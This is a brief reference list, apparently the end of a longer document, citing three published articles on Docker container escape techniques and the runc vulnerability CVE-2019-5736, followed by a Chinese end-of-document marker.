- [Container Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [HackTricks - Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [CVE-2019-5736 Analysis](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)

---

*文档结束*
